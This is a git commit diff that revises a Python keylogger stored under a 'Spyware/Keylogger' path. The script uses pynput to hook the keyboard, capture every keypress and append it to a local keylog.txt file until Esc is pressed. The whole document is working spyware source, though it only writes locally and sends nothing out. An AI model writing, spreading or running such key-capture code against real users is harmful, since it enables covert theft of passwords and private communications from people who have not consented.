f9edc29c3134385e90d58ea2d83587fbe3f2b867
Luc-1577 <142753165+Luc-1577@users.noreply.github.com>
2024-04-06 11:13:34 -0300

    Add files via upload

--- Spyware/Keylogger/keylogger.py
+++ Spyware/Keylogger/keylogger.py
@@ -1,27 +1,33 @@
 from pynput import keyboard
+import os
 
 def get_info(key):
-    with open('keylog.txt', 'r') as fil:
-        words = fil.read()
-    with open('keylog.txt', 'w') as fil:
-        fil.write(words + key)
+    global path
+
+    with open(path, 'a+') as fil:
+        fil.write(key)
 
 def logger(key):
     if key == keyboard.Key.space:
         x = ' '
 
     elif key == keyboard.Key.enter:
-        x = '\n\n'
+        x = '\n'
         
     else:
         x = (str(key))
-        
+        x = x[1:-1]
     get_info(x)
 
 def release(key):
-    if key == keyboard.ControllerKey.esc:
+    if key == keyboard.Key.esc:
         # Stop listener
         return False
+
+dirpath = os.path.dirname(__file__)
+path = os.path.join(dirpath, 'keylog.txt')
+with open(path, 'a+') as fil:
+    fil.write('\n\n')
     
 with keyboard.Listener(on_press=logger, on_release=release) as ls:
     ls.join()
